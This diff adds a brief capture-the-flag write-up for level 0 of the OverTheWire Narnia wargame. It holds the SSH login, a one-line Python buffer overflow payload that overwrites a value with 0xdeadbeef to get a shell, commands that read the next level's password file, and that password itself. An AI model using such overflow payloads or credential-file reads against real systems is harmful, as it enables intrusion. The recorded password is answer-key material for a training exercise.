@@ -1,0 +1,12 @@
+### Login via SSH
+
+- ssh narnia0@narnia.labs.overthewire.org -p 2226
+
+### Buffer Overflow vulnerability
+
+- (python3 -c 'import sys; sys.stdout.buffer.write(b"A" * 20 + b"\xef\xbe\xad\xde")'; cat) | ./narnia0
+
+- id
+- cat /etc/narnia_pass/narnia1
+
+narnia1 password -> WDcYUTG5ul
